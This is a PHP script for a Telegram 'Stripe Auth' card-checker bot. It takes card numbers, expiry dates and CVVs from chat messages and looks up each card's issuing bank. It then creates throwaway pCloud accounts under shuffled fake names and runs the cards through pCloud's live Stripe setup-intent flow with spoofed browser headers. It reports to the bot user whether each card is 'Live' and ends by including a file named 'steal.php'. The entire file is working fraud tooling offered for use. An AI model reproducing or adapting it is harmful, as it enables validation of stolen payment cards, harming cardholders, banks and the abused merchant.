<?php
$start_time = microtime(true);

if ($message == '.au' or $message == '/au' or $message == '!au' or $message == ',au' or $message == '?au') {sendMessage($chatId, "<b>✅𝙶𝚊𝚝𝚎 𝙸𝚗𝚏𝚘: %0A• STRIPE AUTH [V1]%0A• 𝙾𝚝𝚑𝚎𝚛 𝙶𝚊𝚝𝚎𝚜: /cmds </b>", $message_id);exit();}


include 'Tools/regex.php';

if ( empty($cc) or empty($mes) or empty($year) or empty($cvv) ) 
{sendMessage($chatId, "<b>⚠ [ALERT] PLEASE CHECK THE INPUT FIELDS AND TRY AGAIN</b>", $message_id);exit();}

$i = explode("|", $lista);
$cc = $i[0];
$c1 = substr($cc, 0, 4); 
$c2 = substr($cc, 4, 4); 
$c3 = substr($cc, 8, 4); 
$c4 = substr($cc, -4);
$mon = $i[1];
$year = $i[2];
$cvv = $i[3];

if(strlen($year) == 4){
$year = substr($year, 2);
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$first = ucfirst(str_shuffle('mealGBWGDSGDGthamkerxzz987654232'));
$last = ucfirst(str_shuffle('Hackerzzisbestokvai'));
$com = ucfirst(str_shuffle('waifuu'));
$first1 = str_shuffle("Hackerxz34fvHJVDVzbotopvai");

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

# 01 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.pcloud.com/register');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'Origin: https://www.pcloud.com',
'Referer: https://www.pcloud.com/',
'Accept: application/json, text/javascript, */*; q=0.01',
'sec-fetch-site: cross-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'termsaccepted=yes&mail='.$first.'%40mail.com&password=qewrvgaervge&os=4&device=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F110.0.0.0+Safari%2F537.36&language=en&ref=50');
$curl1 = curl_exec($ch);

#02. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.pcloud.com/login');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'Origin: https://www.pcloud.com',
'Referer: https://www.pcloud.com/',
'Accept: application/json, text/javascript, */*; q=0.01',
'sec-fetch-site: cross-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'username='.$first.'%40mail.com&password=qewrvgaervge&deviceid=qiqx4t2s3i5cpyu9llvopyzwnxezqgwlc8lz&language=en&_t=1678086976370&logout=1&getlastsubscription=1&promoinfo=1&os=4&osversion=0.0.0');
$curl2 = curl_exec($ch);
$auth = trim(strip_tags(getStr($curl2,'auth": "','"')));

# 03 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'scheme: https',
'accept: application/json',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US',
'content-length: 326',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'time_on_page=234839&pasted_fields=number&guid=NA&muid=d33765a6-6f30-4125-8f3b-d42c7daab6c3a35932&sid=b58a4b89-4b3d-4256-9943-cfa3f23be9ae7d5cee&key=pk_live_iHIxB7OJrLLocOUih5WWEfc3&payment_user_agent=stripe.js%2F78ef418&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mon.'&card[exp_year]=20'.$year.'&card[name]=Jack+Coddrey');
$curl3 = curl_exec($ch);
$token = trim(strip_tags(getStr($curl3,'id": "','"')));
$status1 = trim(strip_tags(getStr($curl3,'status": "','"')));
$dcode1 = trim(strip_tags(getStr($curl3,'decline_code": "','"')));
$messagee1 = trim(strip_tags(getStr($curl3,'"message": "','",')));

#04. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.pcloud.com/billing/stripe/setupintent');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'Origin: https://www.pcloud.com',
'Referer: https://www.pcloud.com/',
'Accept: application/json, text/javascript, */*; q=0.01',
'sec-fetch-site: cross-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'auth='.$auth.'');
$curl4 = curl_exec($ch);
$setii = trim(strip_tags(getStr($curl4,'clientsecret": "','"')));
$seti = trim(strip_tags(getStr($curl4,'clientsecret": "','_secre')));

#05. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents/'.$seti.'/confirm');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'Origin: https://www.pcloud.com',
'Referer: https://www.pcloud.com/',
'Accept: application/json, text/javascript, */*; q=0.01',
'sec-fetch-site: cross-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[card][token]='.$token.'&payment_method_data[guid]=2431adf2-8fcd-478b-a337-370454913ac5714113&payment_method_data[muid]=d33765a6-6f30-4125-8f3b-d42c7daab6c3a35932&payment_method_data[sid]=b58a4b89-4b3d-4256-9943-cfa3f23be9ae7d5cee&payment_method_data[payment_user_agent]=stripe.js%2F36d27f7e5c%3B+stripe-js-v3%2F36d27f7e5c&payment_method_data[time_on_page]=238677&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_iHIxB7OJrLLocOUih5WWEfc3&client_secret='.$setii.'');
$curl5 = curl_exec($ch);
$status = trim(strip_tags(getStr($curl5,'status": "','"')));
$dcode = trim(strip_tags(getStr($curl5,'decline_code": "','"')));
$messagee = trim(strip_tags(getStr($curl5,'"message": "','",')));
curl_close($ch);

$end_time = microtime(true);
$time0 = $end_time - $start_time;
$time = substr_replace($time0, '',4);

if (strpos($curl3, 'card_error')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE AUTH [V1] %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜: ❌ Failed To Auth %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $messagee1 - $dcode1 %0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 :<b><a href='tg://user?id=$userId'>$userId</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>𝗧𝗫𝗙𝗡𝗫𝗫 </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
elseif (strpos($curl3, 'invalid_request_error')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE AUTH [V1] %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜: ❌ Failed To Auth %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $messagee1 - $dcode1 %0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 :<b><a href='tg://user?id=$userId'>$userId</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>FARES</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
elseif (strpos($curl3, 'three_d_secure_redirect')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE AUTH [V1] %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜: ❌ Failed To Auth ( 3D Authentication - Redirected To Bank's Authentication Page )%0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 :<b><a href='tg://user?id=$userId'>$userId</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>FARES</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
elseif (strpos($curl5, '3ds2')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE AUTH [V1] %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜: ❌ Failed To Auth ( 3D Authentication - Redirected To Bank's Authentication Page )%0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 :<b><a href='tg://user?id=$userId'>$userId</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>FARES</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
elseif (strpos($curl5, 'card_error')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE AUTH [V1] %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜: ❌ Failed To Auth %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $messagee - $dcode %0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 :<b><a href='tg://user?id=$userId'>$userId</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>FARES</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
elseif (strpos($curl5, 'requires_payment_method')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE AUTH [V1] %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜: ❌ Failed To Auth %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $messagee - $dcode %0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 :<b><a href='tg://user?id=$userId'>$userId</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
elseif (strpos($curl5, 'status": "succeeded')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE AUTH [V1] %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜: ✅ Stripe Auth Live ( $status )%0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 :<b><a href='tg://user?id=$userId'>$userId</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
else{
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE AUTH [V1] %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜: ❌ Failed To Auth %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $messagee - $dcode %0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 :<b><a href='tg://user?id=$userId'>$userId</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
include 'Tools/steal.php';
curl_close($ch);

?>